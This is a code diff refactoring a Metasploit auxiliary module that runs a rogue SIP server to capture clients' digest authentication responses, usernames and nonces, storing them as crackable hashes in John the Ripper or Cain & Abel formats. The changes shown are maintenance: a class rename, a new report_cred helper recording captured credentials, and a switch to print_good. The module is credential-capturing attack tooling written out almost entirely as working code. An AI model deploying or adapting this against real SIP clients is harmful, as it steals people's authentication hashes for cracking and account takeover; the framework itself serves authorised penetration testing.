@@ -1,13 +1,11 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
 require 'rex/socket'
 
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
 
   def initialize
@@ -32,12 +30,12 @@ class Metasploit3 < Msf::Auxiliary
         OptString.new('NONCE', [ true, "The server byte nonce", "1234" ]),
         OptString.new('JOHNPWFILE',  [ false, "The prefix to the local filename to store the hashes in JOHN format", nil ]),
         OptString.new('CAINPWFILE',  [ false, "The local filename to store the hashes in Cain&Abel format", nil ]),
-      ], self.class)
+      ])
     register_advanced_options(
       [
         OptString.new("SRVVERSION", [ true, "The server version to report in the greeting response", "ser (3.3.0-pre1 (i386/linux))" ]),
         OptString.new('REALM', [false, "The SIP realm to which clients authenticate", nil ]),
-      ], self.class)
+      ])
   end
 
   def sip_parse_authorization(data)
@@ -104,6 +102,32 @@ class Metasploit3 < Msf::Auxiliary
     return addr
   end
 
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: opts[:service_name],
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      origin_type: :service,
+      module_fullname: fullname,
+      username: opts[:user],
+      private_data: opts[:password],
+      private_type: :password
+    }.merge(service_data)
+
+    login_data = {
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::UNTRIED,
+      proof: opts[:proof]
+    }.merge(service_data)
+
+    create_credential_login(login_data)
+  end
+
   def run
     begin
       @port = datastore['SRVPORT'].to_i
@@ -139,18 +163,15 @@ class Metasploit3 < Msf::Auxiliary
             algorithm= ( auth_tokens['algorithm'] ? auth_tokens['algorithm'] : "MD5" )
             username = auth_tokens['username']
             proof = "client: #{client_ip}; username: #{username}; nonce: #{datastore['NONCE']}; response: #{response}; algorithm: #{algorithm}"
-            print_status("SIP LOGIN: #{proof}")
+            print_good("SIP LOGIN: #{proof}")
 
-            report_auth_info(
-              :host  => @requestor[:ip],
-              :port => @requestor[:port],
-              :sname => 'sip_client',
-              :user => username,
-              :pass => response + ":" + auth_tokens['nonce'] + ":" + algorithm,
-              :type => "sip_hash",
-              :proof => proof,
-              :source_type => "captured",
-              :active => true
+            report_cred(
+              ip: @requestor[:ip],
+              port: @requestor[:port],
+              service_name: 'sip_client',
+              user: username,
+              password: response + ":" + auth_tokens['nonce'] + ":" + algorithm,
+              proof: proof
             )
 
             if datastore['JOHNPWFILE']
